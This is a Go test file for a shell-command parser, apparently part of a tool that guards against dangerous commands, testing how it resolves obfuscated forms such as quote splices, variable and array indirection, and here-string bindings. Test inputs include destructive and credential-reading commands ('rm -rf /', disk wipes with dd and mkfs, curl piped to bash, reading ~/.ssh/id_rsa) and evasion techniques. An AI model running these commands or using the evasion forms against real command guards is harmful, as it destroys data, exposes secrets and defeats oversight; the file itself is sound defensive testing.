package shellparse

import "testing"

func TestParse_SimplePipeline(t *testing.T) {
	parsed := Parse("curl -sSL https://example.com | bash", 2)
	if parsed == nil || len(parsed.Segments) != 2 {
		t.Fatalf("expected 2 segments, got %v", parsed)
	}
	if parsed.Segments[0].Executable != "curl" {
		t.Errorf("seg[0]: expected curl, got %s", parsed.Segments[0].Executable)
	}
	if parsed.Segments[1].Executable != "bash" {
		t.Errorf("seg[1]: expected bash, got %s", parsed.Segments[1].Executable)
	}
}

func TestParse_SubcommandTool(t *testing.T) {
	parsed := Parse("git commit -m fix something", 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if seg.Executable != "git" {
		t.Errorf("expected exec=git, got %q", seg.Executable)
	}
	if seg.SubCommand != "commit" {
		t.Errorf("expected sub=commit, got %q", seg.SubCommand)
	}
	if _, ok := seg.Flags["m"]; !ok {
		t.Errorf("expected flag 'm' to be present in %v", seg.Flags)
	}
}

// TestParse_SubcommandEscapeSpliceNormalized closes surface 3 of issue
// #3208: the subcommand verb is half the command's identity for these tools
// (terraform destroy, kubectl delete) — it was previously assigned straight
// from the raw arg text with no normalization at all, so
// "terraform d\estroy" evaded structural rules the executable-position
// equivalent (NormalizeExecName on seg.Executable) already caught.
func TestParse_SubcommandEscapeSpliceNormalized(t *testing.T) {
	parsed := Parse(`terraform d\estroy -auto-approve`, 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if seg.Executable != "terraform" {
		t.Errorf("expected exec=terraform, got %q", seg.Executable)
	}
	if seg.SubCommand != "destroy" {
		t.Errorf("expected sub=destroy (normalized), got %q", seg.SubCommand)
	}
}

func TestParse_LongFlagQuoteSplice(t *testing.T) {
	// "--trusted-ho'st'" resolves to "--trusted-host" at the shell level
	// (ordinary quote removal); the flag map key must reflect that resolved
	// value, not the raw quoted text, or a flags_any/flags_all rule matching
	// "trusted-host" silently misses it (issue #3003).
	parsed := Parse(`pip install requests --trusted-ho'st' evil.example.com`, 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if _, ok := seg.Flags["trusted-host"]; !ok {
		t.Errorf("expected flag 'trusted-host' to be present after quote-splice normalization, got %v", seg.Flags)
	}
	if _, ok := seg.Flags["trusted-ho'st'"]; ok {
		t.Errorf("raw quote-spliced key must not survive normalization, got %v", seg.Flags)
	}
}

func TestParse_LongFlagQuoteSpliceWithValue(t *testing.T) {
	// Quote-splice inside a "--flag=value" long option: the key must resolve
	// to "output-document" and the value must still be captured.
	parsed := Parse(`wget --output-docum'ent'=/tmp/x https://example.com/f`, 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	v, ok := seg.Flags["output-document"]
	if !ok {
		t.Fatalf("expected flag 'output-document' to be present after quote-splice normalization, got %v", seg.Flags)
	}
	if v != "/tmp/x" {
		t.Errorf("expected flag value /tmp/x, got %q", v)
	}
}

func TestParse_ShortFlagComboQuoteSpliceUnaffected(t *testing.T) {
	// Short combined flags are inherently immune (char-by-char extraction),
	// but must still resolve correctly once quote noise is stripped from the
	// combo token.
	parsed := Parse(`rm -'r'f /etc/nginx`, 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if _, ok := seg.Flags["r"]; !ok {
		t.Errorf("expected flag 'r' to be present, got %v", seg.Flags)
	}
	if _, ok := seg.Flags["f"]; !ok {
		t.Errorf("expected flag 'f' to be present, got %v", seg.Flags)
	}
}

func TestParse_GhTwoLevelSubcommand(t *testing.T) {
	parsed := Parse("gh issue create --body 'text' --title 'Fix'", 2)
	if parsed == nil || len(parsed.Segments) == 0 {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if seg.Executable != "gh" {
		t.Errorf("expected exec=gh, got %q", seg.Executable)
	}
	if seg.SubCommand != "issue" {
		t.Errorf("expected sub=issue, got %q", seg.SubCommand)
	}
	// "create" should be in Args[0] (available for 2-level lookup)
	if len(seg.Args) == 0 || seg.Args[0] != "create" {
		t.Errorf("expected args[0]=create, got %v", seg.Args)
	}
}

func TestParse_Redirects(t *testing.T) {
	// A CallExpr statement's redirects are owned by its segment, not bubbled
	// to the top level (#3047) — top-level Redirects is reserved for a
	// redirect on a compound construct itself ("{ ...; } > file"), which has
	// no single owning segment.
	parsed := Parse("echo hello > /tmp/out.txt", 2)
	if parsed == nil {
		t.Fatal("expected parsed result")
	}
	if len(parsed.Segments) == 0 {
		t.Fatal("expected at least one segment")
	}
	if len(parsed.Segments[0].Redirects) == 0 {
		t.Fatal("expected segment redirects")
	}
	if parsed.Segments[0].Redirects[0].Path != "/tmp/out.txt" {
		t.Errorf("expected redirect path /tmp/out.txt, got %q", parsed.Segments[0].Redirects[0].Path)
	}
}

func TestParse_InlineCode(t *testing.T) {
	// bash -c creates subcommands when inline code is parsed
	parsed := Parse(`bash -c "echo hello"`, 2)
	if parsed == nil {
		t.Fatal("expected parsed result")
	}
	if len(parsed.Segments) == 0 {
		t.Fatal("expected at least one segment")
	}
	seg := parsed.Segments[0]
	if seg.Executable != "bash" {
		t.Errorf("expected exec=bash, got %q", seg.Executable)
	}
	if !seg.IsShell {
		t.Error("expected IsShell=true for bash")
	}
	if _, hasC := seg.Flags["c"]; !hasC {
		t.Error("expected flag 'c' to be present")
	}
}

func TestParse_EvalInlineCode(t *testing.T) {
	// eval is a builtin, not a shell interpreter — it never sets IsShell — but
	// its argument IS shell source and must still resolve to a subcommand (#3059).
	parsed := Parse("eval 'mkfs.ext4 /dev/sda1'", 2)
	if parsed == nil {
		t.Fatal("expected parsed result")
	}
	seg := parsed.Segments[0]
	if seg.Executable != "eval" {
		t.Errorf("expected exec=eval, got %q", seg.Executable)
	}
	if seg.IsShell {
		t.Error("expected IsShell=false for eval (it's a builtin, not an interpreter)")
	}
	if len(parsed.Subcommands) != 1 {
		t.Fatalf("expected 1 subcommand recursed from eval, got %d", len(parsed.Subcommands))
	}
	sub := parsed.Subcommands[0].Segments
	if len(sub) == 0 || sub[0].Executable != "mkfs.ext4" {
		t.Errorf("expected recursed subcommand exec=mkfs.ext4, got %v", sub)
	}
}

func TestExtractInlineCode_Eval(t *testing.T) {
	cases := []struct {
		name, command, want string
	}{
		{"single-quoted", `eval 'rm -rf /'`, "rm -rf /"},
		{"double-quoted", `eval "rm -rf /"`, "rm -rf /"},
		{"unquoted", `eval rm -rf /`, "rm -rf /"},
		{"multi-word-quoted", `eval 'rm' '-rf' '/'`, "rm -rf /"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			parsed := Parse(tc.command, 2)
			if parsed == nil || len(parsed.Segments) == 0 {
				t.Fatal("expected parsed result")
			}
			got := ExtractInlineCode(parsed.Segments[0])
			if got != tc.want {
				t.Errorf("ExtractInlineCode(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

func TestExtractInlineCode_FlagBeforeC(t *testing.T) {
	// A value-taking flag before "-c" must not shift the extracted payload
	// onto the flag's value (#3059) — Args[0]-based extraction broke here.
	cases := []struct {
		name, command, want string
	}{
		{"short-flag-with-value", "bash -O expand_aliases -c 'rm -rf /'", "rm -rf /"},
		{"long-flag-with-value", "bash --rcfile /tmp/x -c 'rm -rf /'", "rm -rf /"},
		{"short-flag-cluster", "sh -ec 'rm -rf /'", "rm -rf /"},
		{"no-preceding-flag", "bash -c 'rm -rf /'", "rm -rf /"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			parsed := Parse(tc.command, 2)
			if parsed == nil || len(parsed.Segments) == 0 {
				t.Fatal("expected parsed result")
			}
			got := ExtractInlineCode(parsed.Segments[0])
			if got != tc.want {
				t.Errorf("ExtractInlineCode(%q) = %q, want %q", tc.command, got, tc.want)
			}
		})
	}
}

// TestParse_IndirectExecutableResolution covers #3089: an executable name
// delivered through one level of indirection (a scalar variable or a trivial
// echo command substitution) must resolve to the real command so
// structural/semantic/dataflow/stateful rules see it exactly as if it had
// been written directly.
func TestParse_IndirectExecutableResolution(t *testing.T) {
	tests := []struct {
		name       string
		cmd        string
		wantExec   string
		wantArgs   []string
		segmentIdx int // segment to check (0 unless noted)
	}{
		{
			// "x=rm" is its own bare-assignment statement (segment 0, empty
			// Executable) before the real segment that uses it.
			name:       "scalar var $NAME",
			cmd:        "x=rm;$x -rf /",
			wantExec:   "rm",
			wantArgs:   []string{"/"},
			segmentIdx: 1,
		},
		{
			name:       "scalar var ${NAME}",
			cmd:        "x=rm; ${x} -rf /",
			wantExec:   "rm",
			wantArgs:   []string{"/"},
			segmentIdx: 1,
		},
		{
			name:     "echo command substitution",
			cmd:      "$(echo rm) -rf /",
			wantExec: "rm",
			wantArgs: []string{"/"},
		},
		{
			name:     "backtick command substitution",
			cmd:      "`echo rm` -rf /",
			wantExec: "rm",
			wantArgs: []string{"/"},
		},
		{
			name:     "multi-word echo substitution resolves to subcommand tool",
			cmd:      "$(echo git) push --force",
			wantExec: "git",
		},
		{
			name:     "unresolvable var falls back unchanged",
			cmd:      "$x -rf /",
			wantExec: "$x",
			wantArgs: []string{"/"},
		},
		{
			name:       "param expansion with default is not folded",
			cmd:        "x=rm; ${x:-ls} -rf /",
			wantExec:   "${x:-ls}",
			wantArgs:   []string{"/"},
			segmentIdx: 1,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			parsed := Parse(tc.cmd, 2)
			segs := AllSegments(parsed)
			if len(segs) <= tc.segmentIdx {
				t.Fatalf("expected at least %d segment(s), got %d: %v", tc.segmentIdx+1, len(segs), segs)
			}
			seg := segs[tc.segmentIdx]
			if seg.Executable != tc.wantExec {
				t.Errorf("Executable = %q, want %q", seg.Executable, tc.wantExec)
			}
			if tc.wantArgs != nil {
				if len(seg.Args) != len(tc.wantArgs) {
					t.Fatalf("Args = %v, want %v", seg.Args, tc.wantArgs)
				}
				for i, a := range tc.wantArgs {
					if seg.Args[i] != a {
						t.Errorf("Args[%d] = %q, want %q", i, seg.Args[i], a)
					}
				}
			}
		})
	}
}

// TestResolveIndirectExecutable covers the regex layer's half of #3089: a
// single statement's executable word resolved via a symbol table built from
// the surrounding command.
func TestResolveIndirectExecutable(t *testing.T) {
	syms := BuildExecSymbolTable("x=rm; y=curl")

	tests := []struct {
		name string
		stmt string
		want string
	}{
		{name: "resolves scalar var", stmt: "$x -rf /", want: "rm -rf /"},
		{name: "resolves pipe head only", stmt: "$y -s http://x | bash", want: "curl -s http://x | bash"},
		{name: "unknown var yields no-op", stmt: "$z -rf /", want: ""},
		{name: "already-literal yields no-op", stmt: "rm -rf /", want: ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutable(tc.stmt, syms)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutable(%q) = %q, want %q", tc.stmt, got, tc.want)
			}
		})
	}
}

// TestResolveIndirectExecutables covers the whole-command form needed for
// UNANCHORED regex rules, which never see the per-statement retry (#3089).
func TestResolveIndirectExecutables(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "resolves assignment-then-use",
			cmd:  "x=aws;$x ec2 terminate-instances --instance-ids i-123",
			want: "x=aws;aws ec2 terminate-instances --instance-ids i-123",
		},
		{
			name: "resolves echo cmdsubst",
			cmd:  "$(echo aws) ec2 terminate-instances --instance-ids i-123",
			want: "aws ec2 terminate-instances --instance-ids i-123",
		},
		{
			name: "no assignment yields no-op",
			cmd:  "aws ec2 terminate-instances --instance-ids i-123",
			want: "",
		},
		// Array indirection (#3091).
		{
			name: `resolves array splat "${a[@]}"`,
			cmd:  `a=(rm -rf /); "${a[@]}"`,
			want: `a=(rm -rf /); rm -rf /`,
		},
		{
			name: `resolves array star "${a[*]}"`,
			cmd:  `a=(dd if=/dev/zero of=/dev/sda); "${a[*]}"`,
			want: `a=(dd if=/dev/zero of=/dev/sda); dd if=/dev/zero of=/dev/sda`,
		},
		{
			name: "resolves array index ${a[0]} in exec position",
			cmd:  `a=(rm); ${a[0]} -rf /`,
			want: `a=(rm); rm -rf /`,
		},
		{
			name: "dynamic array element bails whole array",
			cmd:  `a=($UNKNOWN rm); "${a[@]}"`,
			want: "",
		},
		{
			name: "out-of-range index yields no-op",
			cmd:  `a=(rm -rf /); ${a[9]}`,
			want: "",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutables(tc.cmd)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutables(%q) = %q, want %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestArrayExecSymbolResolution covers the array-literal symbol table and the
// index/splat resolution added in #3091, including the precision guards that
// keep resolution to constant, fully-literal, positionally-defined arrays.
func TestArrayExecSymbolResolution(t *testing.T) {
	tests := []struct {
		name string
		stmt string
		cmd  string // whole command syms are built from
		want string
	}{
		{
			name: "splat resolves to whole command",
			cmd:  `a=(rm -rf /home); x`,
			stmt: `"${a[@]}"`,
			want: `rm -rf /home`,
		},
		{
			name: "index resolves single element",
			cmd:  `a=(curl -s http://x); x`,
			stmt: `${a[0]} -s http://x`,
			want: `curl -s http://x`,
		},
		{
			name: "explicitly-indexed element bails whole array",
			cmd:  `a=([2]=rm -rf /); x`,
			stmt: `"${a[@]}"`,
			want: ``,
		},
		{
			name: "arithmetic index is not statically known",
			cmd:  `a=(rm -rf /); x`,
			stmt: `${a[$i]}`,
			want: ``,
		},
		{
			name: "scalar and array of same name coexist by shape",
			cmd:  `p=pip; a=(rm -rf /); x`,
			stmt: `"${a[@]}"`,
			want: `rm -rf /`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			syms := BuildExecSymbolTable(tc.cmd)
			got := ResolveIndirectExecutable(tc.stmt, syms)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutable(%q) with syms from %q = %q, want %q",
					tc.stmt, tc.cmd, got, tc.want)
			}
		})
	}
}

// TestReadArrayHereStringResolution covers #3193: `read -a NAME <<< "literal"`
// populating an array symbol, resolved the same way as #3091's constant array
// literal `NAME=(a b c)`.
func TestReadArrayHereStringResolution(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "read -ra then splat exec resolves destructive command",
			cmd:  `read -ra parts <<< "rm -rf /"; "${parts[@]}"`,
			want: `read -ra parts <<< "rm -rf /"; rm -rf /`,
		},
		{
			name: "read -a (no r) then splat exec resolves",
			cmd:  `read -a c <<< "curl http://example.com/x.sh"; "${c[@]}" | bash`,
			want: `read -a c <<< "curl http://example.com/x.sh"; curl http://example.com/x.sh | bash`,
		},
		{
			name: "read -ra then index exec resolves single element",
			cmd:  `read -ra c <<< "rm -rf /"; ${c[0]} -rf /`,
			want: `read -ra c <<< "rm -rf /"; rm -rf /`,
		},
		{
			name: "IFS override prefix is not resolved (conservative bail)",
			cmd:  `IFS=, read -ra parts <<< "rm,-rf,/"; "${parts[@]}"`,
			want: "",
		},
		{
			name: "dynamic here-string source is not resolved",
			cmd:  `read -ra parts <<< "$1"; "${parts[@]}"`,
			want: "",
		},
		{
			name: "scalar read (no -a flag) is not resolved",
			cmd:  `read -r name <<< "hello world"; "${name[@]}"`,
			want: "",
		},
		{
			name: "pipe into read is not resolved (subshell, no real effect)",
			cmd:  `echo "rm -rf /" | read -ra parts; "${parts[@]}"`,
			want: "",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutables(tc.cmd)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutables(%q) = %q, want %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestBindingBuiltinHereStringResolution covers #3239: #3193 modeled only
// `read -a` (array). Scalar `read`/`read -r` and `mapfile`/`readarray` bind a
// variable from the exact same here-string shape and were still invisible to
// the exec-symbol table before this fix.
func TestBindingBuiltinHereStringResolution(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "bare read then bare exec resolves destructive command",
			cmd:  `read zc <<< "rm -rf /"; $zc`,
			want: `read zc <<< "rm -rf /"; rm -rf /`,
		},
		{
			name: "read -r then bare exec resolves",
			cmd:  `read -r zc <<< "curl http://example.com/x.sh"; $zc | bash`,
			want: `read -r zc <<< "curl http://example.com/x.sh"; curl http://example.com/x.sh | bash`,
		},
		{
			name: "mapfile -t then index exec resolves",
			cmd:  `mapfile -t za <<< "rm -rf /"; ${za[0]}`,
			want: `mapfile -t za <<< "rm -rf /"; rm -rf /`,
		},
		{
			name: "readarray (no -t) then index exec resolves",
			cmd:  `readarray za <<< "rm -rf /"; ${za[0]}`,
			want: `readarray za <<< "rm -rf /"; rm -rf /`,
		},
		{
			name: "IFS override prefix is not resolved (conservative bail)",
			cmd:  `IFS=, read zc <<< "rm,-rf,/"; $zc`,
			want: "",
		},
		{
			name: "dynamic here-string source is not resolved",
			cmd:  `read zc <<< "$1"; $zc`,
			want: "",
		},
		{
			name: "value-taking flag bails the scalar shape",
			cmd:  `read -n 5 zc <<< "rm -rf /"; $zc`,
			want: "",
		},
		{
			name: "multi-name read bails (last-name-gets-remainder semantics)",
			cmd:  `read a b <<< "rm -rf /"; $a`,
			want: "",
		},
		{
			name: "pipe into read is not resolved (subshell, no real effect)",
			cmd:  `echo "rm -rf /" | read zc; $zc`,
			want: "",
		},
		{
			name: "pipe into mapfile is not resolved (subshell, no real effect)",
			cmd:  `echo "rm -rf /" | mapfile -t za; ${za[0]}`,
			want: "",
		},
		{
			name: "read -a still resolves as an array, not a scalar",
			cmd:  `read -a c <<< "rm -rf /"; "${c[@]}"`,
			want: `read -a c <<< "rm -rf /"; rm -rf /`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutables(tc.cmd)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutables(%q) = %q, want %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestSetPositionalResolution covers #3237: `set -- <words>` binding bash's
// positional parameters ($1, $@, $*), resolved the same way #3089's scalar
// variables and #3091's array literals are.
func TestSetPositionalResolution(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "index then exec resolves executable name",
			cmd:  `set -- rm; $1 -rf /`,
			want: `set -- rm; rm -rf /`,
		},
		{
			name: "splat resolves the whole command",
			cmd:  `set -- rm -rf /; "$@"`,
			want: `set -- rm -rf /; rm -rf /`,
		},
		{
			name: "star splat resolves the same as at splat",
			cmd:  `set -- dd if=/dev/zero of=/dev/sda; "$*"`,
			want: `set -- dd if=/dev/zero of=/dev/sda; dd if=/dev/zero of=/dev/sda`,
		},
		{
			name: "second positional resolves too",
			cmd:  `set -- sudo rm; $2 -rf /`,
			want: `set -- sudo rm; rm -rf /`,
		},
		{
			name: "no set-- yields no-op",
			cmd:  `rm -rf /`,
			want: "",
		},
		{
			name: "set without explicit -- is option parsing, not a binding",
			cmd:  `set -e; $1 -rf /`,
			want: "",
		},
		{
			name: "shift anywhere in the command bails ALL positional resolution",
			cmd:  `set -- rm ls; shift; $1 -rf /`,
			want: "",
		},
		{
			name: "out-of-range index yields no-op",
			cmd:  `set -- rm; $9 -rf /`,
			want: "",
		},
		{
			name: "dollar-zero is never resolved",
			cmd:  `set -- rm; $0 -rf /`,
			want: "",
		},
		{
			name: "non-literal set operand bails the whole binding",
			cmd:  `set -- "$UNKNOWN"; $1 -rf /`,
			want: "",
		},
		{
			name: "later set-- overwrites an earlier one (last write wins)",
			cmd:  `set -- ls; set -- rm; $1 -rf /`,
			want: `set -- ls; set -- rm; rm -rf /`,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutables(tc.cmd)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutables(%q) = %q, want %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestSetPositionalFuncDeclScoping covers the correctness detail flagged in
// #3237: a function call rebinds $1..$N/$@/$* to its own arguments, so an
// outer `set --` must never resolve a $1 referenced INSIDE a function body —
// exercised at the Parse()/walkStmt level (withoutPositionals), which scopes
// precisely per FuncDecl body rather than bailing for the whole file the way
// the flatter regex-fallback path (BuildExecSymbolTable/
// ResolveIndirectExecutables, see containsFuncDecl) conservatively does.
func TestSetPositionalFuncDeclScoping(t *testing.T) {
	tests := []struct {
		name           string
		cmd            string
		segIdx         int
		wantExecutable string
	}{
		{
			// "rm" bound by the top-level `set --` must NOT leak into f's body.
			name:           "outer set-- does not resolve $1 inside a function body",
			cmd:            `f() { $1 -rf /; }; set -- rm; f`,
			segIdx:         0, // f's body is walked eagerly at declaration
			wantExecutable: "$1",
		},
		{
			// Outside the function, the same outer binding still resolves.
			name:           "outer set-- still resolves $1 outside the function",
			cmd:            `f() { echo hi; }; set -- rm; $1 -rf /`,
			segIdx:         2,
			wantExecutable: "rm",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			pc := Parse(tc.cmd, 2)
			if pc == nil || len(pc.Segments) <= tc.segIdx {
				t.Fatalf("Parse(%q) = %v, want segment at index %d", tc.cmd, pc, tc.segIdx)
			}
			if got := pc.Segments[tc.segIdx].Executable; got != tc.wantExecutable {
				t.Errorf("Parse(%q).Segments[%d].Executable = %q, want %q", tc.cmd, tc.segIdx, got, tc.wantExecutable)
			}
		})
	}
}

func TestParse_FallbackOnInvalidSyntax(t *testing.T) {
	// Unterminated quote — should trigger fallback parse
	parsed := Parse("echo 'unterminated", 2)
	if parsed == nil {
		t.Fatal("expected fallback parse result")
	}
	if len(parsed.Segments) == 0 {
		t.Fatal("expected at least one segment from fallback")
	}
}

// TestSplitTopLevelStatements covers the statement-boundary cases
// IntentExcludedForStatements relies on to scope command_intent_exclude per
// statement instead of over the whole raw command (see intent.go).
func TestSplitTopLevelStatements(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want []string
	}{
		{
			name: "single statement unchanged",
			cmd:  "cat ~/.ssh/id_rsa",
			want: []string{"cat ~/.ssh/id_rsa"},
		},
		{
			name: "semicolon separated",
			cmd:  `cat ~/.ssh/id_rsa; git commit -m "notes"`,
			want: []string{`cat ~/.ssh/id_rsa;`, `git commit -m "notes"`},
		},
		{
			name: "and-and separated",
			cmd:  `cat ~/.ssh/id_rsa && echo done`,
			want: []string{"cat ~/.ssh/id_rsa", "echo done"},
		},
		{
			name: "bare newline separated",
			cmd:  "cat ~/.ssh/id_rsa\ngit commit -m \"unrelated notes\"",
			want: []string{"cat ~/.ssh/id_rsa", `git commit -m "unrelated notes"`},
		},
		{
			name: "pipe separated",
			cmd:  "cat ~/.ssh/id_rsa | base64",
			want: []string{"cat ~/.ssh/id_rsa", "base64"},
		},
		{
			name: "backslash line continuation stays one statement",
			cmd:  "gh issue create -R org/repo \\\n  --title \"t\" \\\n  --body \"b\"",
			want: []string{"gh issue create -R org/repo \\\n  --title \"t\" \\\n  --body \"b\""},
		},
		{
			name: "heredoc body stays attached to its statement",
			cmd:  "cat <<EOF > /tmp/f\nsome content mentioning .ssh/id_rsa\nEOF",
			want: []string{"cat <<EOF > /tmp/f\nsome content mentioning .ssh/id_rsa\nEOF"},
		},
		{
			name: "heredoc body preserved when chained after benign prefix",
			cmd:  "cd /tmp && cat <<EOF > /tmp/f\nbody\nEOF",
			want: []string{"cd /tmp", "cat <<EOF > /tmp/f\nbody\nEOF"},
		},
		{
			name: "unparseable input falls back to whole command",
			cmd:  "echo 'unterminated",
			want: []string{"echo 'unterminated"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := SplitTopLevelStatements(tt.cmd)
			if len(got) != len(tt.want) {
				t.Fatalf("SplitTopLevelStatements(%q) = %q, want %q", tt.cmd, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("segment[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

// TestParamOpConstantFoldResolution covers #3220: a parameter-expansion
// OPERATOR (replace, slice, prefix/suffix removal, case change) applied to a
// scalar already bound to a constant is itself statically computable, the
// same way a bare $NAME/${NAME} reference already resolves (#3089). Exercised
// through ResolveIndirectExecutables, the same entry point
// TestSetPositionalResolution (#3237) uses.
func TestParamOpConstantFoldResolution(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{
			name: "replace operator folds a spliced executable name",
			cmd:  `x=rQm; ${x/Q/} -rf /`,
			want: `x=rQm; rm -rf /`,
		},
		{
			name: "global replace operator folds",
			cmd:  `x=rQmQ; ${x//Q/} -rf /`,
			want: `x=rQmQ; rm -rf /`,
		},
		{
			name: "slice operator folds a padded executable name",
			cmd:  `x=rmZZZ; ${x:0:2} -rf /`,
			want: `x=rmZZZ; rm -rf /`,
		},
		{
			name: "suffix removal operator folds",
			cmd:  `x=rm.bak; ${x%.bak} -rf /`,
			want: `x=rm.bak; rm -rf /`,
		},
		{
			name: "prefix removal operator folds",
			cmd:  `x=xxrm; ${x#xx} -rf /`,
			want: `x=xxrm; rm -rf /`,
		},
		{
			name: "uppercase-all operator folds",
			cmd:  `x=rm; ${x^^} -rf /`,
			want: `x=rm; RM -rf /`,
		},
		{
			name: "unbound variable with operator stays unresolved",
			cmd:  `${UNKNOWN/Q/} -rf /`,
			want: "",
		},
		{
			name: "glob pattern operand is refused, not interpreted",
			cmd:  `x=rXm; ${x/[A-Z]/} -rf /`,
			want: "",
		},
		{
			name: "non-literal replacement value bails",
			cmd:  `x=rQm; y=m; ${x/Q/$y}`,
			want: "",
		},
		{
			name: "default-value operator is a different shape, deliberately not folded here",
			cmd:  `${UNKNOWN:-rm} -rf /`,
			want: "",
		},
		{
			name: "negative slice offset is refused",
			cmd:  `x=rmZZZ; ${x: -3} -rf /`,
			want: "",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := ResolveIndirectExecutables(tc.cmd)
			if got != tc.want {
				t.Errorf("ResolveIndirectExecutables(%q) = %q, want %q", tc.cmd, got, tc.want)
			}
		})
	}
}
